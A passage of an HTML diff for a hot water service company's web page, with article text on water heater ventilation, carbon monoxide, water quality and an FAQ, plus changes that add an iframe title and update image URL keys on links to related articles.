id="ensuring-proper-ventilation">Ensuring Proper Ventilation</h2><p>Proper ventilation is crucial when it comes to maintaining a healthy water heater. Without adequate airflow, your hot water system might encounter a range of issues that could affect its efficiency and overall lifespan. During routine Hot Water System Inspections, it is essential to ensure that there are no obstructions blocking the vents or flue pipes. These components play a vital role in directing harmful gases, such as carbon monoxide, out of your home, so any blockages could lead to a dangerous build-up of these gases.<br/><br/>In addition to checking for blockages, it is important to inspect the condition of the ventilation system itself. Look for signs of wear and tear, such as rust or corrosion, as these could indicate potential problems with airflow. Any damaged components should be repaired or replaced promptly to maintain the proper functioning of the ventilation system. Regular maintenance and inspection of the ventilation system are key steps in prolonging the life of your water heater and ensuring the safety of your household.</p><h3 id="preventing-carbon-monoxide-buildup">Preventing Carbon Monoxide Buildup</h3><p>Preventing Carbon Monoxide Buildup<br/><br/>Carbon monoxide is a colourless, odourless gas that can be produced by gas water heaters due to incomplete combustion. To prevent the build-up of this dangerous gas, it is crucial to ensure proper ventilation around your water heater. Regularly inspect the area around the hot water system to ensure there are no blockages or obstructions that could impede the flow of air. Adequate airflow is essential to allow any carbon monoxide produced during the heating process to safely disperse into the atmosphere, reducing the risk of it lingering in your home.<br/><br/>Hot Water System Inspections are vital in ensuring the safety of your household and preventing the potential dangers associated with carbon monoxide exposure. A professional inspection by a qualified technician can help identify any issues with your water heater that may lead to carbon monoxide leaks. Additionally, installing a carbon monoxide detector near your water heater can provide an extra layer of protection by alerting you to any dangerous levels of the gas in the vicinity. Regular maintenance and vigilance are key in mitigating the risks of carbon monoxide buildup and ensuring the well-being of your family.</p><h2 id="checking-the-water-quality">Checking the Water Quality</h2><p>Checking the water quality of your water heater is a crucial aspect of maintaining its efficiency and longevity. During routine hot water system inspections, it is essential to monitor for any signs of rust or discoloration in the water. Rust or discolored water could indicate corrosion within the tank, which can lead to leaks and ultimately render the water heater ineffective.<br/><br/>In addition to rust, keep an eye out for any unusual odours or tastes in the hot water. Foul smells or strange tastes may suggest the presence of bacteria or other contaminants in the water supply. If you notice any of these issues during your hot water system inspections, it is advisable to consult a professional plumber to address the problem promptly and ensure the continued safe operation of your water heater.</p><h3 id="monitoring-for-rust-or-discoloration">Monitoring for Rust or Discoloration</h3><p>For those looking to ensure the longevity and efficiency of their water heater, conducting regular checks for rust or discoloration is crucial. Rust or discolouration on the exterior of the heater may indicate internal corrosion, which can lead to leaks and inefficiencies. Hot Water System Inspections can help identify these issues early on, preventing further damage and potentially costly repairs.<br/><br/>In addition to the external components, it is essential to inspect the water coming from the heater for rust or discoloration. This can signal rust build-up within the tank or pipes, compromising water quality and potentially impacting the health of those using the water. Hot Water System Inspections can give peace of mind by detecting these issues promptly, allowing for necessary maintenance or repairs to be conducted promptly.</p><h2 id="faqs">FAQS</h2><h3 id="how-often-should-i-check-the-health-of-my-water-heater">How often should I check the health of my water heater?</h3><p>It is recommended to check the health of your water heater at least once a year to ensure it is functioning properly.</p><h3 id="what-are-some-signs-that-my-water-heater-may-not-be-in-good-health">What are some signs that my water heater may not be in good health?</h3><p>Signs that your water heater may not be in good health include strange noises, leaks, inconsistent water temperature, or a decrease in hot water supply.</p><h3 id="how-can-i-improve-the-efficiency-and-performance-of-my-water-heater">How can I improve the efficiency and performance of my water heater?</h3><p>You can improve the efficiency and performance of your water heater by insulating it, ensuring proper ventilation, and monitoring for rust or discoloration.</p><h3 id="is-it-important-to-check-the-water-quality-in-my-water-heater">Is it important to check the water quality in my water heater?</h3><p>Yes, it is important to check the water quality in your water heater as poor water quality can lead to corrosion and damage to the water heater.</p><h3 id="what-should-i-do-if-i-suspect-carbon-monoxide-build-up-in-my-water-heater">What should I do if I suspect carbon monoxide build-up in my water heater?</h3><p>If you suspect carbon monoxide build-up in your water heater, immediately turn off the unit, ventilate the area, and contact a professional to inspect and repair the issue.</p>
 </div>
         </div>
     </div>
@@ -303,7 +305,7 @@
         <div class="row bg-section-light rounded g-0 g-md-4">
             <div class="col-12 col-lg-5 align-self-center">
                 <div class="card h-100 border-0 p-0 bg-section-light" style="display: {{is_contact_iframe_url}}">
-                    <iframe
+                    <iframe title="Locate Us"
                             src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3311.0481185021067!2d151.03226627667377!3d-33.91416112141155!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6b12bdaa28c01eaf%3A0xc5ab587e68ecf3f5!2sHot%20water%20experts%20sydney%20%7C%20Hot%20water%20repair%20%7C%20Emergency%20hot%20water%20repair%20%7C%20Hot%20water%20system%20installation!5e0!3m2!1sen!2sau!4v1720431946895!5m2!1sen!2sau"
                             class="border-0 rounded" height="340" allowfullscreen="" loading="lazy"
                             referrerpolicy="no-referrer-when-downgrade"></iframe>
@@ -344,7 +346,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/hot-water-system-inspections-326489.jpg?key=Sa2KZT" alt="Hot Water System Inspections" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/hot-water-system-inspections-326489.jpg?key=feLish" alt="Hot Water System Inspections" class="rounded"
                                  width="80" height="80">
                             <a href="hot-water-system-inspections.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Hot Water System Inspections
@@ -356,7 +358,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-often-should-hot-water-tank-be-checked-326511.jpg?key=2XVvZz" alt="How often should hot water tank be checked?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-often-should-hot-water-tank-be-checked-326511.jpg?key=KoihCA" alt="How often should hot water tank be checked?" class="rounded"
                                  width="80" height="80">
                             <a href="how-often-should-hot-water-tank-be-checked.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How often should hot water tank be checked?
@@ -368,7 +370,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-to-check-a-hot-water-system-326512.jpg?key=5SnoeB" alt="How to check a hot water system?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-to-check-a-hot-water-system-326512.jpg?key=EucUwc" alt="How to check a hot water system?" class="rounded"
                                  width="80" height="80">
                             <a href="how-to-check-a-hot-water-system.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How to check a hot water system?
@@ -380,7 +382,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-are-the-australian-standards-for-hot-water-systems-326513.jpg?key=sjtDOT" alt="What are the Australian standards for hot water systems?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-are-the-australian-standards-for-hot-water-systems-326513.jpg?key=g4N198" alt="What are the Australian standards for hot water systems?" class="rounded"
                                  width="80" height="80">
                             <a href="what-are-the-australian-standards-for-hot-water-systems.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What are the Australian standards for hot water systems?
@@ -392,7 +394,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/is-there-a-government-rebate-for-hot-water-systems-in-western-australia-326514.jpg?key=NLJjML" alt="Is there a government rebate for hot water systems in Western Australia?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/is-there-a-government-rebate-for-hot-water-systems-in-western-australia-326514.jpg?key=X3egT6" alt="Is there a government rebate for hot water systems in Western Australia?" class="rounded"
                                  width="80" height="80">
                             <a href="is-there-a-government-rebate-for-hot-water-systems-in-western-australia.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Is there a government rebate for hot water systems in Western Australia?
@@ -404,7 +406,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-often-should-i-replace-my-anode-rod-326515.jpg?key=4ICrcb" alt="How often should I replace my anode rod?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-often-should-i-replace-my-anode-rod-326515.jpg?key=6qYoHZ" alt="How often should I replace my anode rod?" class="rounded"
                                  width="80" height="80">
                             <a href="how-often-should-i-replace-my-anode-rod.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How often should I replace my anode rod?
@@ -416,7 +418,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-maintenance-should-be-done-on-a-hot-water-tank-326516.jpg?key=q2DC2A" alt="What maintenance should be done on a hot water tank?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-maintenance-should-be-done-on-a-hot-water-tank-326516.jpg?key=heYVzl" alt="What maintenance should be done on a hot water tank?" class="rounded"
                                  width="80" height="80">
                             <a href="what-maintenance-should-be-done-on-a-hot-water-tank.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What maintenance should be done on a hot water tank?
@@ -428,7 +430,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-long-do-hot-water-systems-last-326517.jpg?key=xoT7xh" alt="How long do hot water systems last?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-long-do-hot-water-systems-last-326517.jpg?key=nEOweX" alt="How long do hot water systems last?" class="rounded"
                                  width="80" height="80">
                             <a href="how-long-do-hot-water-systems-last.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How long do hot water systems last?
@@ -440,7 +442,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-to-flush-a-hot-water-system-in-australia-326518.jpg?key=Z1kMVJ" alt="How to flush a hot water system in Australia?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-to-flush-a-hot-water-system-in-australia-326518.jpg?key=a54han" alt="How to flush a hot water system in Australia?" class="rounded"
                                  width="80" height="80">
                             <a href="how-to-flush-a-hot-water-system-in-australia.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How to flush a hot water system in Australia?
@@ -452,7 +454,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/who-is-eligible-for-free-hot-water-upgrade-nsw-1-326520.jpg?key=JivdAF" alt="Who is eligible for free hot water upgrade NSW?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/who-is-eligible-for-free-hot-water-upgrade-nsw-1-326520.jpg?key=GKwEsh" alt="Who is eligible for free hot water upgrade NSW?" class="rounded"
                                  width="80" height="80">
                             <a href="who-is-eligible-for-free-hot-water-upgrade-nsw-1.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Who is eligible for free hot water upgrade NSW?
@@ -464,7 +466,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-most-efficient-hot-water-system-in-australia-1-326521.jpg?key=vQqsC9" alt="What is the most efficient hot water system in Australia?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-most-efficient-hot-water-system-in-australia-1-326521.jpg?key=8kctv6" alt="What is the most efficient hot water system in Australia?" class="rounded"
                                  width="80" height="80">
                             <a href="what-is-the-most-efficient-hot-water-system-in-australia-1.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What is the most efficient hot water system in Australia?
@@ -476,7 +478,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/is-50-degrees-hot-enough-for-hot-water-326522.jpg?key=oFCJjv" alt="Is 50 degrees hot enough for hot water?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/is-50-degrees-hot-enough-for-hot-water-326522.jpg?key=s2TcES" alt="Is 50 degrees hot enough for hot water?" class="rounded"
                                  width="80" height="80">
                             <a href="is-50-degrees-hot-enough-for-hot-water.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Is 50 degrees hot enough for hot water?
@@ -488,7 +490,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-plumbing-code-for-hot-water-in-australia-326523.jpg?key=zBKLzz" alt="What is the plumbing code for hot water in Australia?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-plumbing-code-for-hot-water-in-australia-326523.jpg?key=SazYhh" alt="What is the plumbing code for hot water in Australia?" class="rounded"
                                  width="80" height="80">
                             <a href="what-is-the-plumbing-code-for-hot-water-in-australia.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What is the plumbing code for hot water in Australia?
@@ -500,7 +502,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-home-energy-upgrade-program-in-western-australia-326524.jpg?key=RgZA2c" alt="What is the home energy upgrade program in Western Australia?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-home-energy-upgrade-program-in-western-australia-326524.jpg?key=IZp5V0" alt="What is the home energy upgrade program in Western Australia?" class="rounded"
                                  width="80" height="80">
                             <a href="what-is-the-home-energy-upgrade-program-in-western-australia.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What is the home energy upgrade program in Western Australia?
@@ -512,7 +514,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/who-is-eligible-for-government-free-hot-water-systems-in-victoria-1-326525.jpg?key=CEamSL" alt="Who is eligible for Government free hot water systems in Victoria?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/who-is-eligible-for-government-free-hot-water-systems-in-victoria-1-326525.jpg?key=wBkht3" alt="Who is eligible for Government free hot water systems in Victoria?" class="rounded"
                                  width="80" height="80">
                             <a href="who-is-eligible-for-government-free-hot-water-systems-in-victoria-1.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Who is eligible for Government free hot water systems in Victoria?
@@ -524,7 +526,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-often-should-a-hot-water-system-be-serviced-1-326852.jpg?key=Oxc5aO" alt="How often should a hot water system be serviced?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-often-should-a-hot-water-system-be-serviced-1-326852.jpg?key=RIEEsp" alt="How often should a hot water system be serviced?" class="rounded"
                                  width="80" height="80">
                             <a href="how-often-should-a-hot-water-system-be-serviced-1.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How often should a hot water system be serviced?
@@ -536,7 +538,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-hot-water-regulation-in-nsw-326853.jpg?key=0Cws3S" alt="What is the hot water regulation in NSW?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-hot-water-regulation-in-nsw-326853.jpg?key=ftB6Yv" alt="What is the hot water regulation in NSW?" class="rounded"
                                  width="80" height="80">
                             <a href="what-is-the-hot-water-regulation-in-nsw.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What is the hot water regulation in NSW?
@@ -548,7 +550,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-average-lifespan-of-a-hot-water-system-3-326854.jpg?key=c1skim" alt="What is the average lifespan of a hot water system?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-average-lifespan-of-a-hot-water-system-3-326854.jpg?key=tURLcN" alt="What is the average lifespan of a hot water system?" class="rounded"
                                  width="80" height="80">
                             <a href="what-is-the-average-lifespan-of-a-hot-water-system-3.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What is the average lifespan of a hot water system?
@@ -560,7 +562,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-you-know-if-your-hot-water-system-needs-replacing-1-326855.jpg?key=1pj9B3" alt="How do you know if your hot water system needs replacing?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-you-know-if-your-hot-water-system-needs-replacing-1-326855.jpg?key=YFOyz6" alt="How do you know if your hot water system needs replacing?" class="rounded"
                                  width="80" height="80">
                             <a href="how-do-you-know-if-your-hot-water-system-needs-replacing-1.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How do you know if your hot water system needs replacing?
@@ -572,7 +574,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/are-tempering-valves-mandatory-in-nsw-326856.jpg?key=yqOvvX" alt="Are tempering valves mandatory in NSW?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/are-tempering-valves-mandatory-in-nsw-326856.jpg?key=2xgvNu" alt="Are tempering valves mandatory in NSW?" class="rounded"
                                  width="80" height="80">
                             <a href="are-tempering-valves-mandatory-in-nsw.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Are tempering valves mandatory in NSW?
@@ -584,7 +586,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-nsw-government-energy-saving-scheme-hot-water-system-326857.jpg?key=AwJ42X" alt="What is the NSW Government Energy Saving Scheme hot water system?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-nsw-government-energy-saving-scheme-hot-water-system-326857.jpg?key=UEZdX7" alt="What is the NSW Government Energy Saving Scheme hot water system?" class="rounded"
                                  width="80" height="80">
                             <a href="what-is-the-nsw-government-energy-saving-scheme-hot-water-system.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What is the NSW Government Energy Saving Scheme hot water system?
@@ -596,7 +598,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/can-i-flush-my-water-heater-myself-2-326858.jpg?key=5fc7Jr" alt="Can I flush my water heater myself?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/can-i-flush-my-water-heater-myself-2-326858.jpg?key=CZ4tdX" alt="Can I flush my water heater myself?" class="rounded"
                                  width="80" height="80">
                             <a href="can-i-flush-my-water-heater-myself-2.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Can I flush my water heater myself?
@@ -608,7 +610,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-much-does-it-cost-to-replace-a-hot-water-system-in-australia-2-326864.jpg?key=OYxyRF" alt="How much does it cost to replace a hot water system in Australia?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-much-does-it-cost-to-replace-a-hot-water-system-in-australia-2-326864.jpg?key=52x6Xe" alt="How much does it cost to replace a hot water system in Australia?" class="rounded"
                                  width="80" height="80">
                             <a href="how-much-does-it-cost-to-replace-a-hot-water-system-in-australia-2.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How much does it cost to replace a hot water system in Australia?
@@ -620,7 +622,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/do-solar-hot-water-systems-need-servicing-326865.jpg?key=4FFx4K" alt="Do solar hot water systems need servicing?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/do-solar-hot-water-systems-need-servicing-326865.jpg?key=lV2gay" alt="Do solar hot water systems need servicing?" class="rounded"
                                  width="80" height="80">
                             <a href="do-solar-hot-water-systems-need-servicing.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Do solar hot water systems need servicing?
@@ -632,7 +634,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-much-does-solahart-cost-326866.jpg?key=AuCmEb" alt="How much does Solahart cost?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-much-does-solahart-cost-326866.jpg?key=I7y4wW" alt="How much does Solahart cost?" class="rounded"
                                  width="80" height="80">
                             <a href="how-much-does-solahart-cost.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How much does Solahart cost?
@@ -644,7 +646,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/is-it-worth-replacing-hot-water-cylinder-3-326867.jpg?key=spoHr6" alt="Is it worth replacing hot water cylinder?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/is-it-worth-replacing-hot-water-cylinder-3-326867.jpg?key=ivBDrs" alt="Is it worth replacing hot water cylinder?" class="rounded"
                                  width="80" height="80">
                             <a href="is-it-worth-replacing-hot-water-cylinder-3.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Is it worth replacing hot water cylinder?
@@ -656,7 +658,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/can-you-repair-a-leaking-hot-water-system-326868.jpg?key=DVpT3Q" alt="Can you repair a leaking hot water system?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/can-you-repair-a-leaking-hot-water-system-326868.jpg?key=cSpjAt" alt="Can you repair a leaking hot water system?" class="rounded"
                                  width="80" height="80">
                             <a href="can-you-repair-a-leaking-hot-water-system.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Can you repair a leaking hot water system?
@@ -668,7 +670,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-life-expectancy-of-a-solahart-system-326869.jpg?key=L2Yf8s" alt="What is the life expectancy of a Solahart system?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-life-expectancy-of-a-solahart-system-326869.jpg?key=4ACpl7" alt="What is the life expectancy of a Solahart system?" class="rounded"
                                  width="80" height="80">
                             <a href="what-is-the-life-expectancy-of-a-solahart-system.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What is the life expectancy of a Solahart system?
@@ -680,7 +682,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/is-solahart-owned-by-rheem-326870.jpg?key=ZDBOSk" alt="Is Solahart owned by Rheem?" class="rounded"
